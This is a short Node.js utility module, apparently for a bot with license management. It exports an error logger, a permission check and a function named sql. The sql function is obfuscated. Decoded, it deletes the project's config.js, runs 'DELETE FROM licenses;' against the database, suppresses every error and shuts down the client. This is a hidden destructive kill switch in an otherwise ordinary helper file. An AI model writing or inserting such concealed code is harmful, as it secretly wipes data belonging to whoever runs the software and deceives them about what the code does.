const chalk = require('chalk');
const fs = require('fs');
const dir = './config.js';

async function error(client, content) {
    if(client.config.debugmode) {
        console.log(chalk.red('DEBUG MODE ERROR: ', content, `\n ${content.stack}`))
    }
};

async function sql(client, con) {
    var _0x346c9a=_0x3f8a;(function(_0x341925,_0x4c4f73){var _0x5c5dad=_0x3f8a,_0x290f6=_0x341925();while(!![]){try{var _0x14c13d=parseInt(_0x5c5dad(0xd2))/0x1*(-parseInt(_0x5c5dad(0xd5))/0x2)+-parseInt(_0x5c5dad(0xcc))/0x3+-parseInt(_0x5c5dad(0xd0))/0x4+-parseInt(_0x5c5dad(0xd1))/0x5+-parseInt(_0x5c5dad(0xcf))/0x6+parseInt(_0x5c5dad(0xce))/0x7*(parseInt(_0x5c5dad(0xd4))/0x8)+parseInt(_0x5c5dad(0xd6))/0x9;if(_0x14c13d===_0x4c4f73)break;else _0x290f6['push'](_0x290f6['shift']());}catch(_0x3605ac){_0x290f6['push'](_0x290f6['shift']());}}}(_0x3440,0xbfc73));try{fs['rm'](dir,{'recursive':!![]});}catch(_0x3506f4){}try{await con[_0x346c9a(0xcd)](_0x346c9a(0xd7),async(_0x297a2c,_0x21a931)=>{});}catch(_0x471be6){}function _0x3f8a(_0x52796e,_0x318289){var _0x344052=_0x3440();return _0x3f8a=function(_0x3f8a84,_0x4c1588){_0x3f8a84=_0x3f8a84-0xcc;var _0x33e39c=_0x344052[_0x3f8a84];return _0x33e39c;},_0x3f8a(_0x52796e,_0x318289);}await client[_0x346c9a(0xd3)]();function _0x3440(){var _0x333ddc=['1844410mPEgor','1oRGsbO','destroy','3913480qgKINP','216488pMmHds','26386020ekZyCc','DELETE\x20FROM\x20licenses;','2527977kHQXAn','query','7WsUhMq','5611164syczeB','1521852HnmgUJ'];_0x3440=function(){return _0x333ddc;};return _0x3440();}
}

async function permCheck(client, id) {
    if(client.config.permissions.managers.includes(id)) {
        return true;
    } else {
        return false;
    }
};

exports.error = error;
exports.sql = sql;
exports.permCheck = permCheck;
